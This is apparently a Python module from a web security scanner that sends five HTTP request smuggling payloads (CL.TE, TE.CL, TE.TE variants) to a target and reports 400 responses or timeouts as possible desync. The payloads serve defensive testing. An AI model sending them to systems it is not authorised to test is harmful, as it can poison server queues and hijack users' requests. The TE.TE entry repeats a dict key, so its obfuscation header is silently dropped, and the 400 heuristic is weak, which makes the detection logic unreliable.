import copy
import httpx
from modules.scanner.base_check import BaseCheck, CheckResult

SMUGGLING_PAYLOADS = [
    {
        "name": "CL.TE (Content-Length / Transfer-Encoding)",
        "headers": {
            "Content-Length": "13",
            "Transfer-Encoding": "chunked",
        },
        "content": "0\r\n\r\nG",
    },
    {
        "name": "TE.CL (Transfer-Encoding / Content-Length)",
        "headers": {
            "Transfer-Encoding": "chunked",
            "Content-Length": "4",
        },
        "content": "5c\r\nGPOST /404 HTTP/1.1\r\nContent-Length: 15\r\n\r\n0\r\n\r\n",
    },
    {
        "name": "TE.TE (Transfer-Encoding obfuscation)",
        "headers": {
            "Transfer-Encoding": "xchunked",
            "Transfer-Encoding": "chunked",
        },
        "content": "0\r\n\r\n",
    },
    {
        "name": "CL.TE with garbage",
        "headers": {
            "Content-Length": "6",
            "Transfer-Encoding": "chunked",
        },
        "content": "0\r\nX\r\n",
    },
    {
        "name": "TE.CL with chunked",
        "headers": {
            "Transfer-Encoding": "chunked",
            "Content-Length": "0",
        },
        "content": "G",
    },
]


class RequestSmugglingCheck(BaseCheck):
    name = "request_smuggling"

    async def run(self, base_request: dict, target_params: list[str]) -> list[CheckResult]:
        results = []
        async with httpx.AsyncClient(verify=False, timeout=15, follow_redirects=False) as client:
            for payload in SMUGGLING_PAYLOADS:
                modified = copy.deepcopy(base_request)
                req_headers = dict(modified.get("headers", {}))
                req_headers.update(payload["headers"])
                modified["headers"] = req_headers
                if payload.get("content"):
                    modified["content"] = payload["content"]

                try:
                    resp = await client.request(**modified)
                    body = resp.text if resp.text else ""
                    status = resp.status_code

                    if status in (200, 201, 204):
                        pass

                    if status == 400:
                        results.append(CheckResult(
                            triggered=True,
                            severity="medium",
                            title=f"Request smuggling - server rejected payload: {payload['name']}",
                            description=f"Server returned 400 for '{payload['name']}' payload, "
                                        f"indicating it may be processing the smuggling attempt.",
                            evidence=f"Payload: {payload['name']}\nStatus: {status}\nHeaders: {payload['headers']}",
                            remediation="Ensure your web server and load balancer handle Content-Length and "
                                        "Transfer-Encoding headers consistently.",
                            cwe="CWE-444",
                        ))

                except httpx.TimeoutException:
                    results.append(CheckResult(
                        triggered=True,
                        severity="medium",
                        title=f"Request smuggling - timeout on payload: {payload['name']}",
                        description=f"Request with '{payload['name']}' payload timed out, "
                                    f"which may indicate a desync condition.",
                        evidence=f"Payload: {payload['name']}\nHeaders: {payload['headers']}",
                        remediation="Ensure consistent parsing of Content-Length and Transfer-Encoding "
                                    "between front-end and back-end servers.",
                        cwe="CWE-444",
                    ))
                except Exception:
                    continue

        return results
